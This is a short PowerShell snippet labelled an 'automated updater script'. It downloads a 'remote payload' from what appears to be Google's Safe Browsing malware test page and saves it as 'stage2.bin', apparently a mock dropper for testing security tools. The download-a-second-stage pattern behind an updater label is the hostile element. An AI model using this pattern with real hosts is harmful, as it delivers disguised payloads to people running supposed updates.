# Automated updater script
$dropUrl = "http://testsafebrowsing.appspot.com/s/malware.html"
Write-Host "Fetching remote payload from $dropUrl"
(New-Object System.Net.WebClient).DownloadFile($dropUrl, "stage2.bin")
